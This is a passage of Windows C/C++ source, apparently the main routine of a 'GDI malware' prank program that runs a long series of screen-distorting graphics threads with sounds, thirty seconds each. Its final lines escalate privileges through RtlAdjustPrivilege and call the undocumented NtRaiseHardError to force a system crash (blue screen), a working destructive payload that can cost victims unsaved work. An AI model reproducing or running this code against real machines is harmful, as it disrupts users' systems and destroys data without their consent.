            TerminateThread(thread16dot1, 0);
            CloseHandle(thread16dot1);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread17 = CreateThread(0, 0, setpixel, 0, 0, 0);
            HANDLE thread17dot1 = CreateThread(0, 0, Verityishere, 0, 0, 0);
            sound17();
            Sleep(30000);
            TerminateThread(thread17, 0);
            CloseHandle(thread17);
            TerminateThread(thread17dot1, 0);
            CloseHandle(thread17dot1);
            InvalidateRect(0, 0, 0);
            
			HANDLE thread18 = CreateThread(0, 0, gdimalware, 0, 0, 0);
			sound18();
			Sleep(30000);
			TerminateThread(thread18, 0);
			CloseHandle(thread18);
			InvalidateRect(0, 0, 0);
			
			HANDLE thread19 = CreateThread(0, 0, TransparentBlt1, 0, 0, 0);
			HANDLE thread19dot1 = CreateThread(0, 0, octagon, 0, 0, 0);
			sound19();
			Sleep(30000);
			TerminateThread(thread19, 0);
			CloseHandle(thread19);
			InvalidateRect(0, 0, 0);
			
			HANDLE thread20 = CreateThread(0, 0, blur1, 0, 0, 0);
			sound20();
			Sleep(30000);
			TerminateThread(thread20, 0);
			CloseHandle(thread20);
			InvalidateRect(0, 0, 0);
		
			HANDLE thread21 = CreateThread(0, 0, KF, 0, 0, 0);
			sound21();
			Sleep(30000);
			TerminateThread(thread21, 0);
			CloseHandle(thread21);
			InvalidateRect(0, 0, 0);
			
			HANDLE thread22 = CreateThread(0, 0, i9gen12, 0, 0, 0);
			HANDLE thread22dot1 = CreateThread(0, 0, IntelCorei9Gen12, 0, 0, 0);
			sound22();
			Sleep(30000);
			InvalidateRect(0, 0, 0);
			
			HANDLE thread23 = CreateThread(0, 0, pentagon, 0, 0, 0);
			sound23();
			Sleep(30000);
			TerminateThread(thread22, 0);
			CloseHandle(thread22);
			TerminateThread(thread22dot1, 0);
			CloseHandle(thread22dot1);
			InvalidateRect(0, 0, 0);
			
			HANDLE thread24 = CreateThread(0, 0, efjegjherf, 0, 0, 0);
			HANDLE thread24dot1 = CreateThread(0, 0, kldfvkj, 0, 0, 0);
			sound24();
			Sleep(30000);
			TerminateThread(thread24, 0);
			CloseHandle(thread24);
			TerminateThread(thread24dot1, 0);
			CloseHandle(thread24dot1);
			TerminateThread(thread23, 0);
			CloseHandle(thread23);
			InvalidateRect(0, 0, 0);
			
			HANDLE thread25 = CreateThread(0, 0, LTSC, 0, 0, 0);
			HANDLE thread25dot1 = CreateThread(0, 0, XdWindowsOS, 0, 0, 0);
			sound25();
			Sleep(30000);
			TerminateThread(thread25, 0);
			CloseHandle(thread25);
			TerminateThread(thread25dot1, 0);
			CloseHandle(thread25dot1);
			InvalidateRect(0, 0, 0);
			
            HANDLE thread26 = CreateThread(0, 0, idk, 0, 0, 0);
            HANDLE thread26dot1 = CreateThread(0, 0, pixelate, 0, 0, 0);
            sound26();
            Sleep(30000);
            TerminateThread(thread26, 0);
            CloseHandle(thread26);
            TerminateThread(thread26dot1, 0);
            CloseHandle(thread26dot1);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread27 = CreateThread(0, 0, IntelCorei912thGen, 0, 0, 0);
            sound27();
            Sleep(30000);
            TerminateThread(thread27, 0);
            CloseHandle(thread27);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread28 = CreateThread(0, 0, cnd, 0, 0, 0);
            sound28();
            Sleep(30000);
            TerminateThread(thread28, 0);
            CloseHandle(thread28);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread29 = CreateThread(0, 0, cdvm, 0, 0, 0);
            sound29();
            Sleep(30000);
            TerminateThread(thread29, 0);
            CloseHandle(thread29);
            InvalidateRect(0, 0, 0);
            
			HANDLE thread30 = CreateThread(0, 0, last, 0, 0, 0);
			sound30();
			Sleep(30000);
            TerminateThread(thread30, 0);
            CloseHandle(thread30);
            InvalidateRect(0, 0, 0);
            
            BOOLEAN bl;
            DWORD response;
            NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
            RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
            RtlAdjustPrivilege(19, 1, 0, &bl);
            NtRaiseHardError(0xC0000251, 0, 0, 0, 6, &response);            
    Sleep(-1);
}